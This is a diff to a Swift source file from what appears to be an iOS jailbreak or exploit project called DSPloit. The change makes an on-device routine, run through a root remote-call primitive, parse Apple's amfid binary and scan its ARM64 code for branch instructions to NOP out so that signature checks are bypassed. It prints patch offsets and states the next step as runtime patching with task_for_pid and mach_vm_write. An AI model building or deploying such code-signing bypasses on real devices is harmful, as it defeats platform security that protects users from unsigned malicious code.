@@ -4944,7 +4944,7 @@ struct AMFIExperimentView: View {
 
         #if !DISABLE_REMOTECALL
         root.executeAsRoot(operation: "dump_amfid") { rc in
-            let result = self.expDumpAmfid(rc: rc)
+            let result = self.expDumpAndAnalyzeAmfid(rc: rc)
             DispatchQueue.main.async {
                 self.results.insert(result, at: 0)
                 self.isRunning = false
@@ -4959,113 +4959,237 @@ struct AMFIExperimentView: View {
     }
 
     #if !DISABLE_REMOTECALL
-    /// Copy /usr/libexec/amfid ke app Documents folder.
-    private func expDumpAmfid(rc: RemoteCall) -> ExperimentResult {
-        let expName = "Dump amfid"
-        var detail = "Dump /usr/libexec/amfid ke Documents\n"
-        detail += "=====================================\n\n"
+    /// Dump amfid binary + analisis on-device: scan ARM64 instruksi untuk patch targets.
+    /// Output: offset CBNZ W0 yang perlu di-NOP untuk bypass signature check.
+    private func expDumpAndAnalyzeAmfid(rc: RemoteCall) -> ExperimentResult {
+        let expName = "Dump + Analyze amfid"
+        var detail = "Dump + Analyze /usr/libexec/amfid (on-device)\n"
+        detail += "================================================\n\n"
 
         let mem = rc.trojanMem
         let srcPathStr = "/usr/libexec/amfid"
-
-        // Destination: app Documents folder
-        let docsDir = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true).first ?? "/var/mobile/Documents"
-        let dstPathStr = "\(docsDir)/amfid_dump"
-
-        detail += "Source: \(srcPathStr)\n"
-        detail += "Destination: \(dstPathStr)\n\n"
-
         let srcPath = remote_alloc_str(rc, srcPathStr)
-        let dstPath = remote_alloc_str(rc, dstPathStr)
 
-        // Open source (read-only)
+        // ── Step 1: Open amfid binary ────────────────────────────────
+        detail += "=== Step 1: Open amfid ===\n"
         let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
         guard srcFd != UInt64(bitPattern: -1) else {
             let err = remote_errno(rc)
             detail += "❌ open(\(srcPathStr)) gagal: errno=\(err)\n"
             RootExecutor.rcall(rc, "free", srcPath)
-            RootExecutor.rcall(rc, "free", dstPath)
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
-        detail += "✅ Source opened (fd=\(srcFd))\n"
 
-        // Open destination (write, create, truncate)
-        RootExecutor.rcall(rc, "unlink", dstPath)
-        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
-        guard dstFd != UInt64(bitPattern: -1) else {
-            let err = remote_errno(rc)
-            detail += "❌ open(dst) gagal: errno=\(err)\n"
-            detail += "Coba tulis ke /var/mobile/Documents/amfid_dump...\n"
+        // Get file size via lseek
+        let fileSize = RootExecutor.rcall(rc, "lseek", srcFd, 0, 2) // SEEK_END=2
+        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0) // SEEK_SET=0, rewind
+        detail += "amfid size: \(fileSize) bytes (\(fileSize / 1024) KB)\n"
 
-            // Fallback: tulis ke path absolut
-            let fallbackPath = remote_alloc_str(rc, "/var/mobile/Documents/amfid_dump")
-            RootExecutor.rcall(rc, "unlink", fallbackPath)
-            let fallbackFd = RootExecutor.rcall(rc, "open", fallbackPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
-            RootExecutor.rcall(rc, "free", fallbackPath)
-
-            guard fallbackFd != UInt64(bitPattern: -1) else {
-                let err2 = remote_errno(rc)
-                detail += "❌ Fallback juga gagal: errno=\(err2)\n"
-                RootExecutor.rcall(rc, "close", srcFd)
-                RootExecutor.rcall(rc, "free", srcPath)
-                RootExecutor.rcall(rc, "free", dstPath)
-                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-            }
-
-            // Copy loop dengan fallback fd
-            let buf = mem + 0x800
-            var totalBytes: UInt64 = 0
-            for _ in 0..<2048 {
-                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
-                if n == 0 || n > 4096 { break }
-                RootExecutor.rcall(rc, "write", fallbackFd, buf, n)
-                totalBytes += n
-            }
+        guard fileSize > 0 && fileSize < 2_000_000 else {
+            detail += "❌ File size tidak masuk akal.\n"
             RootExecutor.rcall(rc, "close", srcFd)
-            RootExecutor.rcall(rc, "close", fallbackFd)
             RootExecutor.rcall(rc, "free", srcPath)
-            RootExecutor.rcall(rc, "free", dstPath)
-
-            detail += "✅ Dumped \(totalBytes) bytes ke /var/mobile/Documents/amfid_dump\n\n"
-            detail += "Ambil file via:\n"
-            detail += "  Files app → On My iPhone → cari amfid_dump\n"
-            detail += "  Atau: AirDrop dari Files app ke PC\n"
-            detail += "\nLalu jalankan di PC:\n"
-            detail += "  python scripts/analyze_amfid.py amfid_dump\n"
-            return ExperimentResult(name: expName, success: totalBytes > 0, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
-        detail += "✅ Destination opened (fd=\(dstFd))\n"
 
-        // Copy loop: read 4KB at a time
-        let buf = mem + 0x800
-        var totalBytes: UInt64 = 0
-        for _ in 0..<2048 {  // max 8MB (2048 * 4KB)
-            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
-            if n == 0 || n > 4096 { break }
-            RootExecutor.rcall(rc, "write", dstFd, buf, n)
-            totalBytes += n
+        // ── Step 2: Read Mach-O header ───────────────────────────────
+        detail += "\n=== Step 2: Read Mach-O header ===\n"
+        let hdrBuf = mem + 0x800
+        RootExecutor.rcall(rc, "read", srcFd, hdrBuf, 4096)
+        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0) // rewind
+
+        let magic = rc[hdrBuf].value32()
+        detail += "magic: 0x\(String(format: "%08x", magic))\n"
+
+        guard magic == 0xFEEDFACF else {
+            detail += "❌ Bukan Mach-O 64-bit (expected 0xFEEDFACF)\n"
+            RootExecutor.rcall(rc, "close", srcFd)
+            RootExecutor.rcall(rc, "free", srcPath)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let cputype = rc[hdrBuf + 4].value32()
+        let ncmds = rc[hdrBuf + 16].value32()
+        detail += "cputype: 0x\(String(format: "%x", cputype)) (\(cputype == 0x0100000C ? "arm64e" : "arm64"))\n"
+        detail += "ncmds: \(ncmds)\n"
+
+        // Parse load commands to find __TEXT segment
+        var textFileOff: UInt64 = 0
+        var textFileSize: UInt64 = 0
+        var textVMAddr: UInt64 = 0
+        var cmdOffset: UInt64 = 32 // sizeof(mach_header_64)
+
+        for _ in 0..<min(ncmds, 32) {
+            let cmd = rc[hdrBuf + cmdOffset].value32()
+            let cmdsize = rc[hdrBuf + cmdOffset + 4].value32()
+
+            if cmd == 0x19 { // LC_SEGMENT_64
+                // Read segment name (16 bytes at +8)
+                var segName = ""
+                for i: UInt64 in 0..<16 {
+                    let ch = rc[hdrBuf + cmdOffset + 8 + i].value8()
+                    if ch == 0 { break }
+                    segName += String(UnicodeScalar(ch))
+                }
+
+                if segName == "__TEXT" {
+                    textVMAddr = rc[hdrBuf + cmdOffset + 24].value64()
+                    let vmsize = rc[hdrBuf + cmdOffset + 32].value64()
+                    textFileOff = rc[hdrBuf + cmdOffset + 40].value64()
+                    textFileSize = rc[hdrBuf + cmdOffset + 48].value64()
+                    detail += "__TEXT: vm=0x\(String(format: "%llx", textVMAddr)), size=0x\(String(format: "%llx", vmsize))\n"
+                    detail += "  fileoff=0x\(String(format: "%llx", textFileOff)), filesize=0x\(String(format: "%llx", textFileSize))\n"
+                }
+            }
+            cmdOffset += UInt64(cmdsize)
+            if cmdOffset >= 4096 { break }
+        }
+
+        guard textFileSize > 0 else {
+            detail += "❌ __TEXT segment tidak ditemukan.\n"
+            RootExecutor.rcall(rc, "close", srcFd)
+            RootExecutor.rcall(rc, "free", srcPath)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ── Step 3: Scan __TEXT untuk patch targets ───────────────────
+        detail += "\n=== Step 3: Scan ARM64 instruksi ===\n"
+        detail += "Mencari pola BL + CBNZ W0 (signature check + error branch)...\n\n"
+
+        // Read __TEXT in chunks and scan for patterns
+        // BL = 0x94xxxxxx (bits[31:26] = 100101)
+        // CBNZ W0 = 0x35xxxxxx with Rt=0 (bits[31:24]=0x35, bits[4:0]=0)
+        // CBZ W0 = 0x34xxxxxx with Rt=0
+        // B.NE = 0x54xxxxxx with cond=0001
+
+        var patchTargets: [(offset: UInt64, vmaddr: UInt64, instr: UInt32, nextInstr: UInt32, ptype: String)] = []
+        let chunkSize: UInt64 = 4096
+        let scanBuf = mem + 0x2000
+
+        // Seek to __TEXT start
+        RootExecutor.rcall(rc, "lseek", srcFd, textFileOff, 0)
+
+        var scannedBytes: UInt64 = 0
+        let maxScan = min(textFileSize, 512 * 1024) // max 512KB scan
+
+        while scannedBytes < maxScan {
+            let toRead = min(chunkSize, maxScan - scannedBytes)
+            let nRead = RootExecutor.rcall(rc, "read", srcFd, scanBuf, toRead)
+            if nRead == 0 || nRead > chunkSize { break }
+
+            // Scan instructions in this chunk (4 bytes each)
+            let instrCount = Int(nRead / 4)
+            for i in 0..<(instrCount - 1) {
+                let instrOff = UInt64(i * 4)
+                let instr = rc[scanBuf + instrOff].value32()
+                let nextInstr = rc[scanBuf + instrOff + 4].value32()
+
+                let fileOffset = textFileOff + scannedBytes + instrOff
+                let vmaddr = textVMAddr + scannedBytes + instrOff
+
+                // Check: is this BL?
+                let isBL = (instr >> 26) == 0x25
+
+                if isBL {
+                    // Check next instruction
+                    let isCBNZ_W0 = (nextInstr >> 24) == 0x35 && (nextInstr & 0x1F) == 0
+                    let isCBZ_W0 = (nextInstr >> 24) == 0x34 && (nextInstr & 0x1F) == 0
+                    let isBNE = (nextInstr & 0xFF00001F) == 0x54000001
+
+                    if isCBNZ_W0 {
+                        patchTargets.append((fileOffset + 4, vmaddr + 4, instr, nextInstr, "BL+CBNZ_W0"))
+                    } else if isCBZ_W0 {
+                        patchTargets.append((fileOffset, vmaddr, instr, nextInstr, "BL+CBZ_W0"))
+                    } else if isBNE {
+                        patchTargets.append((fileOffset + 4, vmaddr + 4, instr, nextInstr, "BL+B.NE"))
+                    }
+                }
+
+                // Also standalone CBNZ W0 (common pattern)
+                let isCBNZ_W0_standalone = (instr >> 24) == 0x35 && (instr & 0x1F) == 0
+                if isCBNZ_W0_standalone && !isBL {
+                    // Check if previous instruction was BL (already caught above)
+                    // Only add if this is a standalone CBNZ not preceded by BL
+                    if i > 0 {
+                        let prevInstr = rc[scanBuf + instrOff - 4].value32()
+                        let prevIsBL = (prevInstr >> 26) == 0x25
+                        if !prevIsBL {
+                            patchTargets.append((fileOffset, vmaddr, instr, 0, "CBNZ_W0"))
+                        }
+                    }
+                }
+
+                if patchTargets.count >= 50 { break }
+            }
+
+            scannedBytes += nRead
+            if patchTargets.count >= 50 { break }
         }
 
         RootExecutor.rcall(rc, "close", srcFd)
-        RootExecutor.rcall(rc, "close", dstFd)
         RootExecutor.rcall(rc, "free", srcPath)
-        RootExecutor.rcall(rc, "free", dstPath)
 
-        detail += "\n✅ Dumped \(totalBytes) bytes (\(totalBytes / 1024) KB)\n\n"
+        detail += "Scanned \(scannedBytes / 1024) KB of __TEXT\n"
+        detail += "Found \(patchTargets.count) patch candidates\n\n"
 
-        if totalBytes == 0 {
-            detail += "❌ File kosong atau tidak bisa dibaca.\n"
+        if patchTargets.isEmpty {
+            detail += "❌ Tidak ada patch candidate ditemukan.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
-        detail += "=== NEXT STEPS ===\n"
-        detail += "1. Buka Files app → On My iPhone → DSPloit → amfid_dump\n"
-        detail += "2. Share/AirDrop ke PC\n"
-        detail += "3. Rename jadi 'amfid' dan taruh di workspace DSPloit\n"
-        detail += "4. Jalankan: python scripts/analyze_amfid.py amfid\n"
-        detail += "5. Script akan output offset patch untuk Exp 84 v2\n"
+        // ── Step 4: Output patch targets ─────────────────────────────
+        detail += "=== Step 4: Patch candidates ===\n"
+        detail += "(NOP = 0xD503201F, MOV W0,#0 = 0x52800000)\n\n"
+
+        // Prioritize BL+CBNZ_W0 (most likely signature check pattern)
+        let blCbnz = patchTargets.filter { $0.ptype == "BL+CBNZ_W0" }
+        let blBne = patchTargets.filter { $0.ptype == "BL+B.NE" }
+        let others = patchTargets.filter { $0.ptype != "BL+CBNZ_W0" && $0.ptype != "BL+B.NE" }
+
+        detail += "HIGH PRIORITY (BL + CBNZ W0): \(blCbnz.count)\n"
+        for (i, t) in blCbnz.prefix(10).enumerated() {
+            let blTarget = decodeBlTarget(t.instr, pc: t.vmaddr - 4)
+            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))"
+            detail += " BL→0x\(String(format: "%llx", blTarget))\n"
+        }
+
+        detail += "\nMEDIUM (BL + B.NE): \(blBne.count)\n"
+        for (i, t) in blBne.prefix(5).enumerated() {
+            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))\n"
+        }
+
+        detail += "\nOTHER (standalone CBNZ W0): \(others.count)\n"
+        for (i, t) in others.prefix(5).enumerated() {
+            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))\n"
+        }
+
+        // ── Step 5: Generate hardcoded offsets ────────────────────────
+        detail += "\n=== Step 5: Offsets untuk Exp 84 v2 ===\n"
+        detail += "amfid __TEXT base on device: 0x\(String(format: "%llx", textVMAddr))\n"
+        detail += "amfid runtime base (dari Exp 84): 0x16cd60000\n\n"
+
+        // Offset dari __TEXT start (untuk runtime patch)
+        detail += "Patch offsets (dari __TEXT start):\n"
+        let topTargets = (blCbnz + blBne).prefix(15)
+        for (i, t) in topTargets.enumerated() {
+            let offFromText = t.vmaddr - textVMAddr
+            detail += "  [\(i)] +0x\(String(format: "%llx", offFromText)) (\(t.ptype)) instr=0x\(String(format: "%08x", t.nextInstr != 0 ? t.nextInstr : t.instr))\n"
+        }
+
+        detail += "\n=== NEXT STEPS ===\n"
+        detail += "Offset di atas akan dipakai Exp 84 v2 untuk patch amfid runtime.\n"
+        detail += "Strategi: dari launchd RC, task_for_pid(amfid) → mach_vm_write → NOP\n"
+        detail += "Atau: hardcode offset + physmap write (jika page table walk berhasil)\n"
 
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+
+    /// Decode BL instruction target address
+    private func decodeBlTarget(_ instr: UInt32, pc: UInt64) -> UInt64 {
+        let imm26 = Int64(instr & 0x3FFFFFF)
+        let signExtended = imm26 & 0x2000000 != 0 ? imm26 | Int64(bitPattern: 0xFFFFFFFFFC000000) : imm26
+        let offset = signExtended << 2
+        return UInt64(Int64(pc) + offset)
     }
     #endif
     
